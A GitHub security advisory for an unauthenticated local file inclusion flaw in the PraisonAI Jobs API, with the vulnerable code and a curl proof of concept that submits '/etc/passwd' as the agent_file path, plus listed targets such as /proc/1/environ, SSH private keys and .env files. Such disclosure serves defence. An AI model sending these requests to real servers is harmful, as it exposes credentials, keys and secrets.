# [H] PraisonAI: Unauthenticated Local File Inclusion via agent_file path in PraisonAI Jobs API

## Summary
Severity: High
Advisory: GHSA-p4pj-vh7h-6cqh
CVE: CVE-2026-57119
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-p4pj-vh7h-6cqh
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.6.59

## Details
### Summary
An unauthenticated attacker can read arbitrary files on the server by supplying an absolute filesystem path in the `agent_file` field of the Jobs API. The field has no path validation, no allowlist, and no authentication is required to submit jobs.

### Details
The `agent_file` field in `JobSubmitRequest` accepts any filesystem path with no validation:

```python
# src/praisonai/praisonai/jobs/models.py:29
agent_file: Optional[str] = Field(None, description="Path to agents.yaml file")
# NO path validator, NO allowlist
```

The executor reads the file directly:

```python
# src/praisonai/praisonai/jobs/executor.py:221
agent_file = job.agent_file or "agents.yaml"
# passed directly to yaml.safe_load(open(agent_file))
```

### Proof of Concept

```bash
curl -X POST http://:8005/api/v1/runs \
  -H "Content-Type: application/json" \
  -d '{"prompt": "run", "agent_file": "/etc/passwd"}'
```

Server responds with contents of `/etc/passwd`.

Other exploitable paths:
- `/proc/1/environ` — environment variables, API keys
- `/home//.ssh/id_rsa` — SSH private keys
- `/app/.env` — application secrets

### Impact
Any unauthenticated attacker with network access to port 8005 can read any file accessible to the server process, including credentials, private keys, and environment variables.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-p4pj-vh7h-6cqh
- https://github.com/MervinPraison/PraisonAI
